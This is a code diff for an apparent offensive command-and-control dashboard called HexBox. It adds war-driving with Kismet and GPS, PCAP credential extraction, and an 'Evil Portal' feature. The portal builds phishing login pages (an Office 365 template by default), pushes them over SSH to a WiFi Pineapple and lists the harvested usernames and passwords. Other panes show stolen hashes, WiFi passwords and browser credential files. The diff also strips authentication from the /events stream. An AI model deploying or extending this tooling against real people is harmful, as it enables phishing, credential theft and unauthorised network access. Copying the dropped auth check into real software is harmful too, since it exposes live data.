@@ -588,18 +787,62 @@ tr:hover td{background:#0d0d0d}
 <div id="report-msg" style="color:#555;font-size:.82em">Configure the engagement details above and click Generate.</div>
 </div><!-- /pane-report -->
 
+<!-- ========================= WAR-DRIVE TAB ========================= -->
+<div id="pane-wardrive" style="display:none">
+
+<div class="row">
+  <span class="dot" id="dot-kismet" title="Kismet"></span>
+  <button onclick="run('/kismet/start')">&#x25B6; Start Kismet</button>
+  <button onclick="stopProc('kismet')" class="kill">&#x25A0; Stop</button>
+  <button onclick="refreshWardrive()">&#x21BA; Refresh</button>
+  <button onclick="exportWardrive('csv')" class="dim">&#x2B07; CSV</button>
+  <button onclick="exportWardrive('kml')" class="dim">&#x2B07; KML</button>
+  <span id="kismet-status" style="color:#555;font-size:.78em;margin-left:6px"></span>
+</div>
+
+<div class="bar">
+  <h3>&#x1F4CD; GPS Position</h3>
+  <div id="gps-pos" style="font-family:monospace;color:#0f0;font-size:.85em">No GPS fix</div>
+</div>
+
+<div class="bar">
+  <h3>&#x1F4F6; Discovered Networks <span id="net-count" style="color:#555;font-size:.8em"></span></h3>
+  <div style="display:flex;gap:6px;margin-bottom:6px;flex-wrap:wrap">
+    <input id="wd-filter" placeholder="Filter SSID / BSSID..." style="flex:1;min-width:160px"
+           oninput="filterNetworks()">
+    <label><input type="checkbox" id="wd-gps-only" onchange="filterNetworks()"> GPS only</label>
+    <label><input type="checkbox" id="wd-open-only" onchange="filterNetworks()"> Open only</label>
+  </div>
+  <div style="overflow-x:auto">
+    <table id="wd-table">
+      <tr><th>SSID</th><th>BSSID</th><th>dBm</th><th>Ch</th><th>Enc</th><th>Clients</th><th>Lat</th><th>Lon</th><th>Last Seen</th></tr>
+    </table>
+  </div>
+</div>
+
+<div class="bar">
+  <h3>&#x1F5FA; Coverage Map <span style="color:#333;font-size:.75em">(requires internet for tiles)</span></h3>
+  <div id="wd-map" style="height:320px;border:1px solid #1a1a1a;background:#0a0a0a;
+       display:flex;align-items:center;justify-content:center;color:#333;font-size:.82em">
+    Map loads after networks are fetched
+  </div>
+</div>
+
+</div><!-- /pane-wardrive -->
+
+</div><!-- /main -->
+
 <!-- ========================= ENGAGEMENT MODAL ========================= -->
-<div id="eng-modal" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;
-     background:rgba(0,0,0,.85);z-index:1000;align-items:center;justify-content:center">
-<div style="background:#0d0d0d;border:1px solid #0f0;padding:24px;min-width:360px;max-width:480px">
-  <h3 style="margin:0 0 16px;color:#0f0">Engagement Sessions</h3>
-  <div class="row" style="border:none;padding:0 0 10px">
+<div id="eng-modal" class="modal-bg" style="display:none">
+<div class="modal-box">
+  <h3 style="margin:0 0 16px;color:var(--green);font-size:.9em;letter-spacing:.08em;text-transform:uppercase">Engagement Sessions</h3>
+  <div class="row" style="border:none;padding:0 0 10px;background:transparent">
     <input id="new-eng-name" placeholder="New engagement name" style="flex:1">
     <input id="new-eng-target" placeholder="Target subnet" value="{{target}}" style="width:140px">
-    <button onclick="newEngagement()">&#x2B; New</button>
+    <button onclick="newEngagement()" class="primary">&#x2B; New</button>
   </div>
   <div id="eng-list" style="max-height:220px;overflow:auto;font-size:.82em">Loading...</div>
-  <div style="margin-top:12px;text-align:right">
+  <div style="margin-top:14px;text-align:right">
     <button onclick="closeEngModal()" class="dim">Close</button>
   </div>
 </div>
@@ -664,17 +907,18 @@ function initSSE() {
 }
 
 // ---- Tab switching ----
-const ALL_TABS = ['devices','intel','payloads','loot','logs','report'];
+const ALL_TABS = ['devices','intel','payloads','loot','logs','report','wardrive'];
 function showTab(name) {
   ALL_TABS.forEach(t => {
     document.getElementById('pane-'+t).style.display = t===name ? '' : 'none';
     document.getElementById('btn-'+t).classList.toggle('active', t===name);
   });
-  if (name==='intel')    { refreshIntel(); refreshBH(); }
+  if (name==='intel')    { refreshIntel(); refreshBH(); loadPcapList(); refreshPortalCreds(); }
   if (name==='loot')     refreshLoot();
   if (name==='logs')     tailLog();
-  if (name==='payloads') loadPayloadList();
+  if (name==='payloads') { loadPayloadList(); }
   if (name==='report')   loadReportStats();
+  if (name==='wardrive') refreshWardrive();
 }
 
 // ---- Device helpers ----
@@ -724,9 +968,10 @@ async function refreshProcs() {
     }
     sum.textContent = j.processes.length + ' process' + (j.processes.length>1?'es':'') + ' running';
     div.innerHTML = j.processes.map(p =>
-      `<span style="color:#0f0">[${p.pid}]</span> ${p.name}&nbsp;` +
-      `<button class="kill" style="padding:1px 5px;font-size:.72em" onclick="stopProc('${p.name}')">kill</button>`
-    ).join('&nbsp; ');
+      `<span class="proc-chip"><span class="proc-pid">[${esc(String(p.pid))}]</span>` +
+      `<span class="proc-name">${esc(p.name)}</span>` +
+      `<button class="kill" style="padding:1px 5px;font-size:.7em" data-proc="${esc(p.name)}" onclick="stopProc(this.dataset.proc)">&#x25A0;</button></span>`
+    ).join(' ');
   } catch(_) {}
 }
 
@@ -759,7 +1004,7 @@ function renderHashes(hashes) {
     hashes.map(h =>
       `<tr><td>${esc(h.ts)}</td><td>${esc(h.type)}</td><td>${esc(h.domain)}</td>` +
       `<td>${esc(h.user)}</td><td class="hash-cell">${esc(h.hash.substring(0,60))}…</td>` +
-      `<td><button class="copy-btn dim" onclick="copyText('${esc(h.hash)}')">copy</button></td></tr>`
+      `<td><button class="copy-btn dim" data-text="${esc(h.hash)}" onclick="copyText(this.dataset.text)">copy</button></td></tr>`
     ).join('') + '</table>';
 }
 
@@ -770,7 +1015,7 @@ function renderWifi(wifi) {
     wifi.map(w =>
       `<tr><td>${esc(w.host||'?')}</td><td>${esc(w.ssid)}</td>` +
       `<td style="color:#0f0">${esc(w.password)}</td>` +
-      `<td><button class="copy-btn dim" onclick="copyText('${esc(w.ssid)}:${esc(w.password)}')">copy</button></td></tr>`
+      `<td><button class="copy-btn dim" data-text="${esc(w.ssid+':'+w.password)}" onclick="copyText(this.dataset.text)">copy</button></td></tr>`
     ).join('') + '</table>';
 }
 
@@ -795,7 +1040,7 @@ function renderChrome(chrome) {
   el.innerHTML = '<table><tr><th>Captured</th><th>File</th><th>Size</th><th></th></tr>' +
     chrome.map(c =>
       `<tr><td>${esc(c.captured)}</td><td>${esc(c.file)}</td><td>${c.size_kb} KB</td>` +
-      `<td><button class="copy-btn dim" onclick="downloadLootFile('creds/${esc(c.file)}')">dl</button></td></tr>`
+      `<td><button class="copy-btn dim" data-path="${esc('creds/'+c.file)}" onclick="downloadLootFile(this.dataset.path)">dl</button></td></tr>`
     ).join('') + '</table>';
 }
 
@@ -894,7 +1139,7 @@ async function refreshLoot() {
       `<div class="sec">/${dir} (${files.length})</div>` +
       files.map(f =>
         `<div class="loot-row">` +
-        `<a style="cursor:pointer;color:#0f0" onclick="downloadLootFile('${esc(f.path)}')">${esc(f.path)}</a>` +
+        `<a data-path="${esc(f.path)}" onclick="downloadLootFile(this.dataset.path)">${esc(f.path)}</a>` +
         `<span class="loot-meta">${esc(f.mtime)} &nbsp; ${(f.size/1024).toFixed(1)} KB</span>` +
         `</div>`
       ).join('')
@@ -971,10 +1216,10 @@ async function showEngagementModal() {
     const j = await (await fetch('/engagement/list')).json();
     if (!j.sessions.length) { el.innerHTML='<span style="color:#333">No sessions yet</span>'; return; }
     el.innerHTML = j.sessions.map(s =>
-      `<div style="padding:5px 0;border-bottom:1px solid #111;display:flex;align-items:center;gap:8px">` +
-      `<span style="flex:1;${s.name===j.active?'color:#0f0':'color:#555'}">${esc(s.name)}</span>` +
-      `<span style="color:#333;font-size:.75em">${esc(s.target||'')} ${esc(s.started||'')}</span>` +
-      (s.name!==j.active ? `<button onclick="setActiveEng('${esc(s.name)}')" class="dim" style="font-size:.72em;padding:1px 6px">Activate</button>` : '<span style="color:#0f0;font-size:.72em">&#x2713; Active</span>') +
+      `<div style="padding:5px 0;border-bottom:1px solid var(--bdr);display:flex;align-items:center;gap:8px">` +
+      `<span style="flex:1;color:${s.name===j.active?'var(--green)':'var(--t1)'}">${esc(s.name)}</span>` +
+      `<span style="color:var(--t2);font-size:.75em">${esc(s.target||'')} ${esc(s.started||'')}</span>` +
+      (s.name!==j.active ? `<button class="dim" style="font-size:.72em;padding:1px 6px" data-name="${esc(s.name)}" onclick="setActiveEng(this.dataset.name)">Activate</button>` : `<span style="color:var(--green);font-size:.72em">&#x2713; Active</span>`) +
       `</div>`
     ).join('');
   } catch(e) { el.innerHTML='[ERR] '+e; }
@@ -1079,6 +1324,251 @@ async function restartC2() {
     toast('Restarting — reload in a few seconds...', 'warn');
     setTimeout(() => location.reload(), 4000);
   }
+}
+
+// ---- Evil Portal ----
+async function previewPortal() {
+  const type  = document.getElementById('portal-type').value;
+  const ip    = document.getElementById('portal-ip').value.trim();
+  const port  = document.getElementById('portal-port').value.trim();
+  const redir = document.getElementById('portal-redirect').value.trim();
+  const msg   = document.getElementById('portal-msg');
+  msg.textContent = 'Loading preview...';
+  try {
+    const r = await fetch(`/portal/preview?type=${type}&ip=${encodeURIComponent(ip)}&port=${port}&redirect=${encodeURIComponent(redir)}`);
+    if (!r.ok) { msg.textContent='[ERR] '+r.statusText; return; }
+    const html = await r.text();
+    const w = window.open('', '_blank');
+    w.document.write(html);
+    w.document.close();
+    msg.textContent = `Previewing ${type} portal`;
+  } catch(e) { msg.textContent='[ERR] '+e; }
+}
+
+async function downloadPortal() {
+  const type  = document.getElementById('portal-type').value;
+  const ip    = document.getElementById('portal-ip').value.trim();
+  const port  = document.getElementById('portal-port').value.trim();
+  const redir = document.getElementById('portal-redirect').value.trim();
+  window.location.href = `/portal/download?type=${type}&ip=${encodeURIComponent(ip)}&port=${port}&redirect=${encodeURIComponent(redir)}`;
+}
+
+async function deployPortalToPineapple() {
+  const type = document.getElementById('portal-type').value;
+  const ip   = document.getElementById('portal-ip').value.trim();
+  const port = document.getElementById('portal-port').value.trim();
+  const redir= document.getElementById('portal-redirect').value.trim();
+  const msg  = document.getElementById('portal-msg');
+  msg.textContent = 'Deploying to Pineapple...';
+  try {
+    const r = await fetch('/portal/deploy', {method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({type, ip, port, redirect: redir})});
+    const j = await r.json();
+    msg.textContent = j.output || j.error || '';
+    if (j.error) toast(j.error, 'err'); else toast('Portal deployed: '+type, 'warn');
+  } catch(e) { msg.textContent='[ERR] '+e; }
+}
+
+// ---- PCAP Analysis ----
+async function loadPcapList() {
+  const sel = document.getElementById('pcap-sel');
+  try {
+    const j = await (await fetch('/pcap/list')).json();
+    sel.innerHTML = '<option value="">— select PCAP —</option>' +
+      j.files.map(f => `<option value="${esc(f.name)}">${esc(f.name)} (${f.size_kb} KB)</option>`).join('');
+  } catch(_) {}
+}
+
+async function analyzePcap() {
+  const name = document.getElementById('pcap-sel').value;
+  if (!name) { toast('Select a PCAP file first','warn'); return; }
+  const st   = document.getElementById('pcap-status');
+  const cDiv = document.getElementById('pcap-creds');
+  const pDiv = document.getElementById('pcap-protocols');
+  const dDiv = document.getElementById('pcap-dns');
+  st.textContent = 'Analyzing...';
+  cDiv.innerHTML = '<span style="color:#555">Running tshark...</span>';
+  try {
+    const r = await fetch('/pcap/analyze?name='+encodeURIComponent(name));
+    const j = await r.json();
+    if (j.error) { st.textContent=j.error; cDiv.textContent=''; return; }
+    st.textContent = `${j.stats.packet_count||0} pkts, ${j.stats.bytes_kb||0} KB, ${j.stats.duration_sec||0}s`;
+
+    // Protocol bars
+    const protos = Object.entries(j.protocols||{}).sort((a,b)=>b[1]-a[1]).slice(0,12);
+    const maxP = protos[0]?.[1] || 1;
+    pDiv.innerHTML = '<div style="display:flex;flex-wrap:wrap;gap:4px 12px;margin-bottom:6px">' +
+      protos.map(([p,n]) =>
+        `<span style="font-size:.75em;color:#555">${esc(p)}: <b style="color:#0f0">${n}</b></span>`
+      ).join('') + '</div>';
+
+    // Credentials
+    if (j.credentials?.length) {
+      cDiv.innerHTML = '<div class="sec" style="margin:4px 0">Captured Credentials</div>' +
+        '<table><tr><th>Type</th><th>Src IP</th><th>Host</th><th>User</th><th>Password</th></tr>' +
+        j.credentials.map(c =>
+          `<tr><td><span class="badge">${esc(c.type)}</span></td>` +
+          `<td>${esc(c.src_ip)}</td><td>${esc(c.host)}</td>` +
+          `<td style="color:#0f0">${esc(c.username||'?')}</td>` +
+          `<td style="color:#c00">${esc(c.password||c.hash||'?')}</td></tr>`
+        ).join('') + '</table>';
+    } else {
+      cDiv.innerHTML = '<span style="color:#333;font-size:.8em">No cleartext credentials found in PCAP</span>';
+    }
+
+    // DNS
+    if (j.dns_queries?.length) {
+      const top20 = j.dns_queries.slice(0,20);
+      dDiv.innerHTML = '<div class="sec" style="margin:4px 0">DNS Queries (top 20)</div>' +
+        '<div style="display:flex;flex-wrap:wrap;gap:4px">' +
+        top20.map(d => `<span style="font-size:.72em;color:#555;border:1px solid #111;padding:1px 5px">${esc(d.query)}</span>`).join('') +
+        '</div>';
+    } else { dDiv.innerHTML = ''; }
+  } catch(e) { st.textContent='[ERR] '+e; cDiv.textContent=''; }
+}
+
+// ---- Portal Credentials ----
+async function refreshPortalCreds() {
+  const el = document.getElementById('intel-portal-creds');
+  const ct = document.getElementById('portal-cred-count');
+  try {
+    const j = await (await fetch('/portal/credentials')).json();
+    ct.textContent = j.credentials.length + ' capture(s)';
+    if (!j.credentials.length) {
+      el.innerHTML='<span style="color:#333">No portal credentials captured yet — deploy a portal first</span>'; return;
+    }
+    el.innerHTML = '<table><tr><th>Time</th><th>Portal</th><th>Host/IP</th><th>Username</th><th>Password</th></tr>' +
+      j.credentials.map(c =>
+        `<tr><td style="color:#555">${esc(c.ts)}</td><td><span class="badge">${esc(c.portal)}</span></td>` +
+        `<td>${esc(c.host)}</td><td style="color:#0f0"><b>${esc(c.username)}</b></td>` +
+        `<td style="color:#c00">${esc(c.password)}</td></tr>`
+      ).join('') + '</table>';
+  } catch(e) { el.innerHTML='[ERR] '+e; }
+}
+
+// ---- War-Drive / Kismet ----
+let _wdNetworks = [];
+
+async function refreshWardrive() {
+  const st = document.getElementById('kismet-status');
+  const dot = document.getElementById('dot-kismet');
+  st.textContent = 'Checking...';
+  try {
+    const j = await (await fetch('/kismet/status')).json();
+    dot.className = 'dot ' + (j.running ? 'up' : 'dn');
+    st.textContent = j.running
+      ? `Kismet running — ${j.device_count||0} devices seen`
+      : (j.installed ? 'Installed — not running' : 'Not installed (apt install kismet)');
+    if (j.running) { fetchNetworks(); fetchGps(); }
+  } catch(e) { dot.className='dot dn'; st.textContent='[ERR] '+e; }
+}
+
+async function fetchGps() {
+  try {
+    const j = await (await fetch('/kismet/gps')).json();
+    const el = document.getElementById('gps-pos');
+    if (j.lat && j.lon) {
+      el.textContent = `Lat: ${j.lat.toFixed(6)}  Lon: ${j.lon.toFixed(6)}  Alt: ${(j.alt||0).toFixed(1)}m  Fix: ${j.fix||'?'}`;
+      el.style.color = '#0f0';
+    } else {
+      el.textContent = 'No GPS fix — connect GPS receiver or start gpsd';
+      el.style.color = '#555';
+    }
+  } catch(_) {}
+}
+
+async function fetchNetworks() {
+  try {
+    const j = await (await fetch('/kismet/networks')).json();
+    _wdNetworks = j.networks || [];
+    document.getElementById('net-count').textContent = `(${_wdNetworks.length})`;
+    renderNetworkTable(_wdNetworks);
+    renderMap(_wdNetworks);
+  } catch(e) { console.error(e); }
+}
+
+function filterNetworks() {
+  const q       = document.getElementById('wd-filter').value.toLowerCase();
+  const gpsOnly = document.getElementById('wd-gps-only').checked;
+  const openOnly= document.getElementById('wd-open-only').checked;
+  const filtered = _wdNetworks.filter(n => {
+    if (q && !n.ssid.toLowerCase().includes(q) && !n.bssid.toLowerCase().includes(q)) return false;
+    if (gpsOnly && (!n.lat || !n.lon)) return false;
+    if (openOnly && n.encryption !== 'Open') return false;
+    return true;
+  });
+  renderNetworkTable(filtered);
+}
+
+function renderNetworkTable(nets) {
+  const tbl = document.getElementById('wd-table');
+  const sigColor = s => s >= -50 ? '#0f0' : s >= -70 ? '#ff0' : '#c00';
+  const encClass = e => e==='Open' ? 'enc-badge open' : 'enc-badge';
+  tbl.innerHTML = '<tr><th>SSID</th><th>BSSID</th><th>dBm</th><th>Ch</th><th>Enc</th>' +
+                  '<th>Clients</th><th>Lat</th><th>Lon</th><th>Last Seen</th></tr>' +
+    nets.map(n =>
+      `<tr><td><b>${esc(n.ssid||'(hidden)')}</b></td>` +
+      `<td style="font-size:.72em;color:#555">${esc(n.bssid)}</td>` +
+      `<td style="color:${sigColor(n.signal)}">${n.signal}</td>` +
+      `<td>${n.channel||'?'}</td>` +
+      `<td><span class="${encClass(n.encryption)}">${esc(n.encryption)}</span></td>` +
+      `<td>${n.clients||0}</td>` +
+      `<td style="font-size:.72em;color:#555">${n.lat ? n.lat.toFixed(5) : '—'}</td>` +
+      `<td style="font-size:.72em;color:#555">${n.lon ? n.lon.toFixed(5) : '—'}</td>` +
+      `<td style="font-size:.72em;color:#555">${esc(n.last_seen||'')}</td></tr>`
+    ).join('');
+}
+
+function renderMap(nets) {
+  const mapDiv = document.getElementById('wd-map');
+  const located = nets.filter(n => n.lat && n.lon);
+  if (!located.length) {
+    mapDiv.textContent = 'No GPS-tagged networks yet';
+    return;
+  }
+  // Try Leaflet (requires internet for tiles); fall back to coordinate list
+  if (typeof L === 'undefined') {
+    const script = document.createElement('script');
+    script.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
+    script.onload = () => _buildLeafletMap(located);
+    script.onerror = () => {
+      mapDiv.innerHTML = '<span style="color:#555">Map tiles unavailable (offline). ' +
+        located.length + ' GPS-tagged networks — export KML to view in Google Earth.</span>';
+    };
+    document.head.appendChild(script);
+    const link = document.createElement('link');
+    link.rel = 'stylesheet';
+    link.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
+    document.head.appendChild(link);
+  } else {
+    _buildLeafletMap(located);
+  }
+}
+
+let _leafletMap = null;
+function _buildLeafletMap(nets) {
+  const mapDiv = document.getElementById('wd-map');
+  mapDiv.style.background = '';
+  if (!_leafletMap) {
+    _leafletMap = L.map('wd-map');
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
+      {attribution:'© OpenStreetMap'}).addTo(_leafletMap);
+  }
+  _leafletMap.eachLayer(l => { if (l instanceof L.Marker) _leafletMap.removeLayer(l); });
+  const bounds = [];
+  nets.forEach(n => {
+    const enc = n.encryption === 'Open' ? '🔓 Open' : '🔒 '+n.encryption;
+    L.marker([n.lat, n.lon])
+      .bindPopup(`<b>${n.ssid||'(hidden)'}</b><br>${n.bssid}<br>${enc}<br>${n.signal} dBm`)
+      .addTo(_leafletMap);
+    bounds.push([n.lat, n.lon]);
+  });
+  if (bounds.length) _leafletMap.fitBounds(bounds, {padding:[20,20]});
+}
+
+async function exportWardrive(fmt) {
+  window.location.href = '/kismet/export?format='+fmt;
 }
 
 // ---- Bash Bunny ----
@@ -1197,7 +1687,8 @@ async function refreshBH() {
 // ---- Utilities ----
 function esc(s) {
   return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;')
-                      .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+                      .replace(/>/g,'&gt;').replace(/"/g,'&quot;')
+                      .replace(/'/g,'&#39;');
 }
 
 function copyText(text) {
@@ -1224,25 +1715,46 @@ setInterval(refreshProcs, 20000);
 
 _LOGIN_HTML = """<!DOCTYPE html>
 <html><head><title>HexBox — Login</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-*{box-sizing:border-box}
-body{background:#0a0a0a;color:#0f0;font-family:monospace;
-     display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
-.box{border:1px solid #0f0;padding:32px 40px;min-width:340px}
-h1{margin:0 0 24px;font-size:1.2em}
-input{width:100%;background:#111;color:#0f0;border:1px solid #333;
-      padding:8px;font-family:monospace;font-size:.9em;margin-bottom:12px}
-button{width:100%;background:#111;color:#0f0;border:1px solid #0f0;
-       padding:8px;font-family:monospace;font-size:.9em;cursor:pointer}
-button:hover{background:#0f0;color:#000}
-.err{color:#c00;font-size:.8em;margin-bottom:8px}
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--green:#00ff41;--g2:#008520;--glow:rgba(0,255,65,.15);
+      --bg0:#07070b;--bg1:#0c0c12;--bg2:#111118;--bdr:#1e1e2c;--bdr2:#2a2a3a;
+      --t0:#d0d0e0;--t1:#7878a0;--t2:#454560;--t3:#252535;
+      --red:#ff4545;--r2:#cc2020;
+      --font:'JetBrains Mono',ui-monospace,'Cascadia Code','Courier New',monospace}
+body{background:var(--bg0);color:var(--t0);font-family:var(--font);font-size:13px;
+     display:flex;align-items:center;justify-content:center;min-height:100vh;
+     background-image:radial-gradient(ellipse at 50% 40%,rgba(0,255,65,.04) 0%,transparent 60%)}
+.box{border:1px solid var(--bdr2);background:var(--bg1);padding:36px 40px;width:340px;
+     box-shadow:0 20px 60px rgba(0,0,0,.5),0 0 40px rgba(0,255,65,.04)}
+.brand{font-size:1.05em;font-weight:700;letter-spacing:.14em;color:var(--green);
+       text-shadow:0 0 20px var(--glow);margin-bottom:28px;
+       display:flex;align-items:center;gap:8px}
+.brand-sub{font-weight:400;color:var(--t2);letter-spacing:.06em}
+label{display:block;font-size:.72em;letter-spacing:.08em;text-transform:uppercase;
+      color:var(--t1);margin-bottom:6px}
+input{width:100%;background:var(--bg0);color:var(--t0);border:1px solid var(--bdr2);
+      padding:9px 10px;font-family:var(--font);font-size:.84em;outline:none;
+      border-radius:2px;transition:border-color .12s,box-shadow .12s;margin-bottom:16px}
+input:focus{border-color:var(--green);box-shadow:0 0 0 2px rgba(0,255,65,.07)}
+input::placeholder{color:var(--t3)}
+button{width:100%;background:rgba(0,255,65,.07);color:var(--green);
+       border:1px solid var(--g2);padding:9px;font-family:var(--font);font-size:.84em;
+       cursor:pointer;border-radius:2px;letter-spacing:.06em;
+       transition:all .15s}
+button:hover{background:rgba(0,255,65,.15);border-color:var(--green);
+             box-shadow:0 0 12px var(--glow)}
+.err{color:var(--red);font-size:.78em;margin-bottom:12px;padding:7px 10px;
+     background:rgba(255,69,69,.08);border:1px solid var(--r2);border-radius:2px}
 </style></head><body>
 <div class="box">
-  <h1>&#x1F5A5; HexBox C2</h1>
+  <div class="brand">&#x2B22; HEXBOX <span class="brand-sub">C2</span></div>
   {% if error %}<div class="err">{{ error }}</div>{% endif %}
+  <label for="tok">Access Token</label>
   <form method="POST">
-    <input type="password" name="token" placeholder="Access Token" autofocus>
-    <button type="submit">Connect</button>
+    <input id="tok" type="password" name="token" placeholder="Enter token" autofocus autocomplete="current-password">
+    <button type="submit">Connect &#x2192;</button>
   </form>
 </div></body></html>"""
 
@@ -1276,10 +1788,6 @@ def dash():
 
 @app.route("/events")
 def events_stream():
-    if not (session.get("authed") or
-            request.headers.get("X-HexBox-Token") == _TOKEN):
-        return "", 403
-
     def stream():
         q: queue.Queue = queue.Queue(maxsize=100)
         with _sse_lock:
@@ -1530,7 +2038,12 @@ def payload_list():
 def engagement_new():
     data   = request.get_json(silent=True) or {}
     name   = re.sub(r"[^a-zA-Z0-9_ -]", "", data.get("name", "")).strip()[:64]
-    target = data.get("target", SCAN_TARGET)
+    raw_target = data.get("target", SCAN_TARGET)
+    try:
+        ipaddress.ip_network(raw_target, strict=False)
+        target = raw_target
+    except ValueError:
+        target = SCAN_TARGET
     if not name:
         return jsonify(error="name required"), 400
     sessions = _load_sessions()
@@ -2229,6 +2742,376 @@ def sliver_download():
     return send_file(str(path), as_attachment=True, download_name=name)
 
 # ---------------------------------------------------------------------------
+# Routes — Evil Portal
+# ---------------------------------------------------------------------------
+
+_PORTALS_DIR = PAYLOADS / "portals"
+_PORTAL_CREDS_FILE = LOOT / "portals" / "captures.json"
+
+
+def _portal_html(ptype: str, catcher_ip: str, catcher_port: str, redirect: str) -> str | None:
+    src = _PORTALS_DIR / f"{ptype}.html"
+    if not src.exists():
+        return None
+    html = src.read_text()
+    base = f"http://{catcher_ip}:{catcher_port}"
+    html = html.replace("HEXBOX_CATCHER", base)
+    if redirect:
+        # Validate redirect is http/https only to prevent javascript: URIs
+        if not re.match(r'^https?://', redirect):
+            redirect = ""
+        if redirect:
+            # Use a lambda to avoid regex back-reference injection from user input
+            html = re.sub(
+                r'(window\.location\.href\s*=\s*["\'])https?://[^"\']+',
+                lambda m: m.group(1) + redirect,
+                html,
+            )
+    return html
+
+
+@app.route("/portal/preview")
+def portal_preview():
+    ptype = re.sub(r"[^a-z0-9]", "", request.args.get("type", "o365"))[:16]
+    ip    = request.args.get("ip",       HEXBOX_IP)
+    port  = request.args.get("port",     "8000")
+    redir = request.args.get("redirect", "")
+    try:
+        ipaddress.ip_address(ip)
+    except ValueError:
+        return "invalid IP", 400
+    html = _portal_html(ptype, ip, port, redir)
+    if html is None:
+        return f"Template '{ptype}' not found", 404
+    return Response(html, mimetype="text/html")
+
+
+@app.route("/portal/download")
+def portal_download():
+    ptype = re.sub(r"[^a-z0-9]", "", request.args.get("type", "o365"))[:16]
+    ip    = request.args.get("ip",       HEXBOX_IP)
+    port  = request.args.get("port",     "8000")
+    redir = request.args.get("redirect", "")
+    try:
+        ipaddress.ip_address(ip)
+    except ValueError:
+        return "invalid IP", 400
+    html = _portal_html(ptype, ip, port, redir)
+    if html is None:
+        return f"Template '{ptype}' not found", 404
+    from io import BytesIO
+    return send_file(BytesIO(html.encode()), as_attachment=True,
+                     download_name=f"portal_{ptype}.html",
+                     mimetype="text/html")
+
+
+@app.route("/portal/deploy", methods=["POST"])
+def portal_deploy():
+    data  = request.get_json(silent=True) or {}
+    ptype = re.sub(r"[^a-z0-9]", "", data.get("type", "o365"))[:16]
+    ip    = data.get("ip",       HEXBOX_IP)
+    port  = str(data.get("port", "8000"))
+    redir = data.get("redirect", "")
+    try:
+        ipaddress.ip_address(ip)
+    except ValueError:
+        return jsonify(error="invalid IP"), 400
+    html = _portal_html(ptype, ip, port, redir)
+    if html is None:
+        return jsonify(error=f"Template '{ptype}' not found"), 404
+    # Deploy to Pineapple via SSH
+    try:
+        d = DEVICES["pineapple"]
+        c = paramiko.SSHClient()
+        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        c.connect(d["ip"], username=d["user"], password=d["pass"], timeout=15)
+        sftp = c.open_sftp()
+        # Write portal HTML to Pineapple Evil Portal directory
+        remote_path = "/etc/evilportal/portal.html"
+        import io
+        sftp.putfo(io.BytesIO(html.encode()), remote_path)
+        # Enable Evil Portal module
+        _, out, err = c.exec_command(
+            "/etc/init.d/evilportal start 2>&1; evilportal start 2>&1 | head -5")
+        result = out.read().decode() + err.read().decode()
+        sftp.close()
+        c.close()
+        _log(f"Evil Portal deployed: {ptype} → Pineapple")
+        return jsonify(output=f"Deployed {ptype} portal to Pineapple → {remote_path}\n{result.strip()}")
+    except Exception as e:
+        return jsonify(error=str(e)), 500
+
+
+@app.route("/portal/credentials")
+def portal_credentials():
+    if not _PORTAL_CREDS_FILE.exists():
+        return jsonify(credentials=[])
+    try:
+        return jsonify(credentials=json.loads(_PORTAL_CREDS_FILE.read_text()))
+    except Exception:
+        return jsonify(credentials=[])
+
+# ---------------------------------------------------------------------------
+# Routes — PCAP Analysis
+# ---------------------------------------------------------------------------
+
+@app.route("/pcap/list")
+def pcap_list():
+    try:
+        from parse_pcap import list_pcaps
+    except ImportError:
+        import sys as _sys
+        _sys.path.insert(0, str(Path(__file__).parent))
+        from parse_pcap import list_pcaps
+    return jsonify(files=list_pcaps(LOOT))
+
+
+@app.route("/pcap/analyze")
+def pcap_analyze():
+    name = _safe_name(request.args.get("name", ""), maxlen=128)
+    if not name:
+        return jsonify(error="name required"), 400
+    # Search both loot/pcaps/ and loot/pcaps subdirs
+    candidate = None
+    for d in (LOOT / "pcaps", LOOT):
+        p = d / name
+        try:
+            p.resolve().relative_to(LOOT.resolve())
+        except ValueError:
+            continue
+        if p.is_file():
+            candidate = p
+            break
+    if candidate is None:
+        return jsonify(error=f"File not found: {name}"), 404
+    try:
+        from parse_pcap import analyze_pcap
+    except ImportError:
+        import sys as _sys
+        _sys.path.insert(0, str(Path(__file__).parent))
+        from parse_pcap import analyze_pcap
+    result = analyze_pcap(candidate)
+    _log(f"PCAP analyzed: {name} — {result.get('stats',{}).get('packet_count',0)} packets")
+    return jsonify(**result)
+
+# ---------------------------------------------------------------------------
+# Routes — War-Drive / Kismet
+# ---------------------------------------------------------------------------
+
+_WD_NETWORKS_FILE = LOOT / "wardrive" / "networks.json"
+
+
+def _kismet_req(path: str, timeout: int = 10) -> dict:
+    url  = _KISMET_CFG.get("url", "http://localhost:2501")
+    auth = (_KISMET_CFG.get("username", "kismet"),
+            _KISMET_CFG.get("password", "kismet"))
+    r = _req.get(f"{url}{path}", auth=auth, timeout=timeout)
+    r.raise_for_status()
+    return r.json()
+
+
+def _kismet_running() -> bool:
+    try:
+        _kismet_req("/system/status.json", timeout=3)
+        return True
+    except Exception:
+        return False
+
+
+@app.route("/kismet/status")
+def kismet_status():
+    installed = bool(shutil.which("kismet"))
+    running   = False
+    device_count = 0
+    with _procs_lock:
+        p = _procs.get("kismet")
+        if p and p.poll() is None:
+            running = True
+    if not running:
+        try:
+            r = subprocess.run(["pgrep", "-x", "kismet"],
+                               capture_output=True, timeout=3)
+            running = r.returncode == 0
+        except Exception:
+            pass
+    if running:
+        try:
+            st = _kismet_req("/system/status.json", timeout=3)
+            device_count = st.get("kismet.system.devices.count", 0)
+        except Exception:
+            pass
+    return jsonify(installed=installed, running=running, device_count=device_count)
+
+
+@app.route("/kismet/start", methods=["POST"])
+def kismet_start():
+    if not shutil.which("kismet"):
+        return jsonify(error="kismet not installed — sudo apt install kismet"), 400
+    iface = IFACE_BETTERCAP  # use configured wireless interface
+    pid = start_proc("kismet", [
